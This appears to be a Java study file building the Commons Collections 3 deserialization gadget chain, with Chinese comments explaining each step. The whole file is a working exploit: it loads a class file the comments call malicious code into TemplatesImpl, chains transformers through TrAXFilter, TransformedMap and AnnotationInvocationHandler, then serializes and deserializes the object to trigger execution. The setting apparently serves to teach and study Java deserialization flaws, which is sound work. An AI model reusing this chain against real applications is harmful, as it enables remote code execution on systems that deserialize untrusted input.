import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

import static utils.ReflectUtils.setFieldValue;
import static utils.SerializeUtils.serialize;
import static utils.SerializeUtils.unserialize;

public class CC3 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        //设置变量，确保函数流程走通
        setFieldValue(templates,"_name","Jasper");
        //code是要传的恶意代码
        byte[] code = Files.readAllBytes(Paths.get("/Users/jasper/Documents/Security/JavaSec/CC/target/classes/pojo/Calc.class"));
        byte[][] codes = {code};
        setFieldValue(templates,"_bytecodes",codes);
        //_tfactory在反序列化的时候会自己赋值，但是如果想调用触发函数templates.newTransformer()看一眼效果，就要设置_tfactory
        //setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        // 触发调用函数
        //templates.newTransformer();
        //new TrAXFilter(templates);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        //instantiateTransformer.transform(TrAXFilter.class);

        //结合CC1-TransformedMap调用instantiateTransformer.transform(TrAXFilter.class);
        Transformer[] transformers =  new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                instantiateTransformer
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform("jasper");
        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put("value","Jasper");
        Map<Object,Object> transformedMap = TransformedMap.decorate(hashMap,null,chainedTransformer);
        Class aihClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor aihConstructor = aihClass.getDeclaredConstructor(Class.class,Map.class);
        aihConstructor.setAccessible(true);
        Object o = aihConstructor.newInstance(Target.class,transformedMap);
        serialize(o);
        unserialize();
    }
}
